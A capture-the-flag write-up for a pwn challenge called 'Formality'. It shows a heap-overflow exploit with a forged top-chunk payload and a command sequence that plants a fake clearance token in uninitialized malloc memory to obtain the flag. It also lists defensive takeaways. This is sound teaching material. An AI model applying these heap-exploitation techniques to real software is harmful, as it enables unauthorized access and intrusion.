# Formality

**Category:** Pwn | **Points:** 1000 | **Author:** Ebo | **Flag:** `HZ{QjR7wUNV_f0rm@l1ty_EUg-xIsI}`

## Challenge Description

A small "formality desk" service (Rust, but the interesting allocations use C's
`malloc`). It lets you create heap notes and write data into them, and offers a
`REQUEST` command that dispenses the flag if a clearance check passes.

> Nobody ever taught the desk to actually look at what it's handing out.

## Initial Analysis

Files: `formality`, `libc.so.6`, `ld-linux-x86-64.so.2` (plus `libpthread.so.0`,
`libgcc_s.so.1` for the bundled loader).

`checksec`:

```text
Arch:       amd64
RELRO:      Full RELRO
Stack:      No canary
NX:         Enabled
PIE:        Disabled
Stripped:   No
```

The binary is unstripped; symbols `formality::draw_clearance` and
`formality::main` stand out. Reading command comparisons in `main` reconstructs
the interface (16 note slots, indices 0–15):

```text
ADD <index> <size>
WRITE <index> <length>
SHOW <index> <length>
REQUEST
QUIT
```

## The Vulnerability / Core Concept

Two bugs combine — no code execution, no libc-address leak needed.

**1. Clearance check trusts uninitialized heap memory.** `draw_clearance`
allocates 256 bytes and immediately treats the old contents as a token:

```c
bool draw_clearance(void) {
    uint64_t *token = malloc(0x100);
    if (!token) return false;
    return token[0] == 0x434c4541525f4b21;   // "!K_RAELC" little-endian
}
```

`malloc` does not zero memory, so if the next `malloc(0x100)` returns a region
whose first 8 bytes are `!K_RAELC`, the check passes.

**2. `WRITE` has no capacity check.** It validates the requested length against a
large `0x10000` stack scratch buffer, but never against the destination note's
capacity, giving a linear heap overflow into glibc metadata and the top chunk.

The plan: overflow past a 256-byte note, forge the top-chunk header, and plant
`!K_RAELC` exactly where the next `malloc(0x100)` (from `REQUEST`) will land.

## Exploitation

Full exploit in `solve.py`. The subtlety is the supplied **glibc 2.31** layout:
after each `ADD`, the program builds/prints/frees a small `"OK"` string, leaving
a freed `0x20` tcache chunk *between* the note and the wilderness. The overflow
must preserve that `0x20` header as valid, then forge the real top chunk after
it.

Layout relative to note 0's pointer:

```text
0x000  our 0x100 bytes of note data
0x100  prev_size of the small 0x20 response chunk
0x108  size (must be 0x21)
0x110  tcache fd / 0x118 tcache key
0x120  top prev_size / 0x128 forged top size (0x101D1)
0x130  user area returned by the next malloc(0x100)  <- plant token here
```

Payload (312 = `0x138` bytes):

```python
payload = flat(
    b"A" * 0x100,
    0, 0x21,        # preserve intervening 0x20 chunk header
    0, 0,           # its tcache fd/key
    0, 0x101D1,     # forged top-chunk header (real page offset 0xe30)
    b"!K_RAELC",    # first 8 bytes of the next malloc(0x100)
)
```

The forged size `0x101D1` gives the top a page-aligned endpoint
(`0xe30 + 0x101d0`) and keeps `PREV_INUSE` set. Full flow:

```python
command(io, b"ADD 0 256")
io.sendline(b"WRITE 0 " + str(len(payload)).encode())
io.send(payload); io.send(b"\n")   # WRITE consumes one separator byte
io.sendline(b"REQUEST")
```

`REQUEST`'s `malloc(0x100)` is carved from the forged top at `note+0x130`, its
first qword is `!K_RAELC`, `draw_clearance` returns true, and the binary
contacts an internal flag-dispenser Unix socket (`/run/flag-dispenser/S.flag`,
protocol `"HZF1" || be_u16(len) || correlation_id`) and prints the flag.

`solve.py` includes a `MOCK` mode that patches the socket path to `/tmp` (same
length) and serves a dummy flag for a full local end-to-end test. On the remote
platform the service was exposed over a WebSocket, bridged to a local TCP port:

```bash
python3 solve.py REMOTE CAPTURE HOST=127.0.0.1 PORT=1337
```

## Flag

`HZ{QjR7wUNV_f0rm@l1ty_EUg-xIsI}`

## Key Takeaways

- `malloc` returns uninitialized memory; its old bytes are never a security
  token. `calloc` would stop this specific trick but wouldn't make the design
  real authentication.
- Validate write length against the *destination*, not just an input scratch
  buffer.
- Tiny logging/response allocations reshape the heap. Preserve every allocator
  chunk the program will touch before your target allocation.
- Reproduce the *supplied* libc locally — the newer system glibc had a cached
  tiny chunk that hid the intervening `0x20` chunk, so the exploit only matched
  remote once the bundled loader/libc were used.
